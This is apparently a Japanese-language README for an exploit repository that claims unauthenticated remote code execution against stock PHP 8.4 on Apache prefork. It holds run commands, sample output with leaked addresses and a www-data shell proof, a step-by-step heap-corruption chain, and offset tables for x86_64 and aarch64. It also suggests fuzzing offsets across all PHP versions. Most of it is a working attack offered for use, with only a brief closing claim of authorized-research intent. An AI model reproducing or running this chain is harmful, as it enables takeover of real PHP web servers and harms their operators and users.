# php2shell - 公式環境、display_errors不要、memory_limit変更なし

[中文](README.md) | [English](readme_en.md) | 日本語

**公式 prefork 構成（MaxRequestWorkers=150）下**で、完全にリモート・HTTP のみ・
対象ページは `<?php echo "OK\n"; ?>` だけ・対象側に PHP を書かないという制約の下、
1 コマンドで RCE を獲得する：

- stock 公式イメージ + 公式 ini + 公式 worker：**10/10**
- 単一 worker ベースライン（初期キャリブレーション/デバッグ）：**20/20**
- 1 回あたり約 3〜4 秒（149 個の占有接続を含む）、固定された worker は再起動せず、
  対象の ini も変更しない

# 汎用的な利用

理論上、すべての PHP バージョンのオフセットを計算し、それらのオフセットを使って
一括でファジングすれば、いずれかのファジングは必ず RCE に到達する。どのみち
worker がクラッシュしても再起動するので、対象を落としてしまう心配もない。

worker について：公式 prefork の `MaxRequestWorkers=150` にも対応済み。スクリプトは
まず 149 個の worker を未完了のリクエストで占有し、残った同一の child に
A1/B1/A2/B2 を固定する。単一 worker はあくまで初期のデバッグ形態
（`--workers 1` でも再現可能）。

## クイックスタート（公式 php.ini-production / display_errors=Off / 128M）

```bash
git clone https://github.com/9bie/php2shell-bypass-aslr-exp.git
cd php2shell-bypass-aslr-exp

# 1) 対象を起動：stock 公式イメージ；コンテナ内では公式の php.ini-production を
#    php.ini としてコピーするだけ
./pure/run_pure.sh
# target: OK
# architecture: x86_64 (run exploit with --arch x86_64)
# PHP 8.4.26 ...
# display_errors => Off => Off
# memory_limit => 128M => 128M
# workers: official (run exploit with --workers 150)

# 2) 1 コマンド：A1 -> B1 リーク -> A2 -> B2 -> id
python3 exploit.py --port 18110
#       --arch auto（デフォルト）：リークから x86_64 / aarch64 を自動判定
#       pinned 150/150 workers (149 holders)
# [try 1] A1: END-cleanup send_cookie OOM
# [try 1] B1: stale-id OOB read (chunk base + libphp)
#       arch=x86_64 decoded=819208 zval_ptr_dtor=0x7fe00ef5db60 -> libphp=0x7fe00e8ff000
#       chunk buckets: [('0x7fe00c600000', 7495), ('0x7fe00ee00000', 1095),
#                       ('0x7fe00cc00000', 87), ('0x7fe00c400000', 79)]
# [try 1] A2 + B2: main=0x7fe00cc00000 S=0x7fe00ccf8398 zif_system=0x7fe00ed64370
# [4/4] RCE OK; proof .../out/p1:
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

PHP/Apache のビルドなし、イメージビルドなし、gdb なし、対象 ini の変更なし。
`pure/run_pure.sh` はデフォルトでコンテナ `p2s-pure-18110`、ポート `18110` を使い、
公式 prefork 構成（MaxRequestWorkers=150）を使用する。起動後には実際のアーキ
テクチャ、ini、MPM の値が表示される。`--single` を付けた場合のみ非公式の単一
worker オーバーライド `pure/docker/apache-single-worker.conf`（`--workers 1` と
組み合わせる）が使われる。`docker/apache.conf` は旧 harness 用に残された互換
シンボリックリンクで、同じファイルを指しているだけ。Linux で docker グループ
権限がない場合、スクリプトは自動的に `sudo docker` にフォールバックする。
明示的に `DOCKER="sudo docker" ./pure/run_pure.sh` としても良い。`--dbg` は
オフラインキャリブレーション用に、シンボル付きの同一ビルドへ切り替えるだけ。

よく使うオプション：

```bash
# ASLR を変えて再テスト（コンテナを再起動）
python3 exploit.py --port 18110 --restart p2s-pure-18110

# 公式 worker がデフォルト；--single で起動した単一 worker 対象には --workers 1
python3 exploit.py --port 18110 --workers 1

# ARM64 も明示的に指定可能（デフォルトの --arch auto は自動判定）
python3 exploit.py --arch aarch64 --port 18110 --workers 1

# 任意のコマンド：マウントディレクトリにスクリプトを書いて sh で実行
printf 'id; uname -a > /out/p1\n' > out/c
python3 exploit.py --port 18110 --cmd 'sh</out/c'
```

`--retries` のデフォルトは 3。ある回の境界外読み取りウィンドウで最も頻出する
ポインタが `zval_ptr_dtor` でない場合、スクリプトは `libphp-main` の妥当な
区間チェックでそのリークを破棄し、チェーン全体をやり直す。

## 純粋な HTTP チェーン

対象ページは `<?php echo "OK\n"; ?>` のみ、攻撃トラフィックは chunked multipart
と通常の GET/POST だけ：

0. **worker pinning**：公式の `MaxRequestWorkers=150` に対して、まず body を
   半分だけ送った POST で 149 個の child を占有し、残りの同一 child に
   A1/B1/A2/B2 を落とし込むことで、リクエストをまたいだ野良ポインタが有効
   になる。
1. **chunked による `post_max_size` バイパス**：`Content-Length` を送らない
   場合、`content_length=0` となり `rfc1867_post_handler` の冒頭チェックが
   スキップされる。これにより 8M をはるかに超える body をヒープ整形に
   使える。
2. **A1**：depth-64 のネストしたファイルフィールド 860 個 + filler + 大きな
   値 + 4000B の `PHP_SESSION_UPLOAD_PROGRESS` を送り、END cleanup 中の
   `php_url_encode` 内で OOM を発生させる。bailout により `PS(id)` /
   `PS(mod_data)` が野良ポインタとして残り、`send_cookie=1` になる。
3. **B1（境界外読み取り）**：安全なクローズの後、`PS(id)` が偽造した
   `zend_string` ヘッダ（len=0xC8000、data に `/` を含む）を指すようにし、
   `Set-Cookie` が id chunk 以降 800KB のメモリをエンコードして返す。
   ウィンドウ内には同時に：
   - 2MiB アラインされた chunk ポインタの集団 → id chunk / main chunk base；
   - `G:400` が id chunk 末尾に残した穴が、900 個のネストした配列フィールドで
     埋められ、本物の HashTable の `pDestructor = zval_ptr_dtor` が 1095 回
     出現 → `libphp = 値 - 0x65EB60`。
4. **A2 + B2**：cheap-OOM によって `PS(hash_serialize_verifier)` がヒープ上
   (`main+0x7D720`) を指すようにする。B2 は 384B の参照値でそれを
   `S=main+0xF8398` を指す zval に上書きする。S には `pDestructor =
   zif_system`（`libphp+0x465370`）を持つ偽の zend_array が仕込まれており、
   shutdown 時に `zend_hash_destroy` が `system("id>/out/p1")` を呼ぶ。

オフセット（このビルド固有、ASLR に依存しない）：

| シンボル/位置 | x86_64 | aarch64 |
|---|---|---|
| リークされた `zval_ptr_dtor` ポインタ | `libphp+0x65EB60` | `libphp+0x63812B` |
| `zif_system` | `libphp+0x465370` | `libphp+0x42CD70` |
| 偽の配列 `S` | `main+0xF8398` | `main+0xF8398` |
| A2 の `hsv` | `main+0x7D720` | `main+0x7D720` |

aarch64 の `zval_ptr_dtor` の ELF シンボルは `0x638120` にあるが、このリーク中
で繰り返し出現するポインタはその 11 バイト後ろにあるため、プロファイルでは
`0x63812B` を減算する。
対象環境：Debian 13 (trixie)、Apache 2.4.69 prefork、PHP 8.4.26 NTS mod_php、
files session handler。PHP のビルド/バージョンが変わればオフセットの再
キャリブレーションが必要。ASLR はコンテナ起動ごとに変わるが、チェーン中の
2 回のリークから実行時に自動で算出される。

## 証拠

- メカニズムとキャリブレーション：[pure/RESEARCH_PURE_128M.md](pure/RESEARCH_PURE_128M.md)
- 全チェーンスクリプト：[exploit.py](exploit.py)（`pure/pwn_pure.py` はエイリアスとして残存）
- デバッグイメージ一括ログ：[pure/evidence/pwn_pure_batch_20261022.log](pure/evidence/pwn_pure_batch_20261022.log)
- 公式イメージログ：[pure/evidence/pwn_pure_official_20261022.log](pure/evidence/pwn_pure_official_20261022.log)
- 公式 worker ログ：[pure/evidence/official_workers_20261022.log](pure/evidence/official_workers_20261022.log)
- ネイティブ ARM64 公式イメージログ（10/10 個の新規コンテナ）：[pure/evidence/arm64_stock_20261023.log](pure/evidence/arm64_stock_20261023.log)
- ネイティブ ARM64 公式 worker ログ（3/3 個の新規コンテナ）：[pure/evidence/arm64_official_workers_20261023.log](pure/evidence/arm64_official_workers_20261023.log)
- proof：[pure/evidence/pwn_pure_proof_p1.txt](pure/evidence/pwn_pure_proof_p1.txt)

## 旧ライン（legacy、本対象ではない）

初期のコミットにあった `exploit.py` は**カスタムの** `docker/php.ini`
（`display_errors=On`、`memory_limit=8M`、`max_input_vars=1000`）を使うもので、
本 README の公式構成の対象とは無関係であり、
[archive/legacy-8m/exploit.py](archive/legacy-8m/exploit.py) に移動済み。同じ
ディレクトリの [HTTP_HEAP_LEAK.md](archive/legacy-8m/HTTP_HEAP_LEAK.md)、
[ASLR_PURE_HTTP.md](archive/legacy-8m/ASLR_PURE_HTTP.md) などはその旧ライン
について説明している。旧来の `docker/php.ini`、`docker/docker-compose.yml`、
`docker/offsets.py`、`lab/apache2_aslr.conf` も `archive/legacy-8m/docker|lab/`
に移動済み。実際の単一 worker 構成と対象ページは `pure/docker/`
（`apache-single-worker.conf`、`www/index.php`）にあり、`docker/` には
`apache.conf`、`www` という、そこを指す互換シンボリックリンクのみが残っている。

## 再現に関する宣言

- 対象の構成は公式の `php.ini-production`（`display_errors=Off`、
  `memory_limit=128M`）と公式の prefork worker（MaxRequestWorkers=150）であり、
  カスタム ini なし、`display_errors=On` への依存なし、対象側のファイルなし、
  `session_start()` なし、配送経路に gdb を使わない。
- 認可された環境における脆弱性研究・再現のみを目的とする。
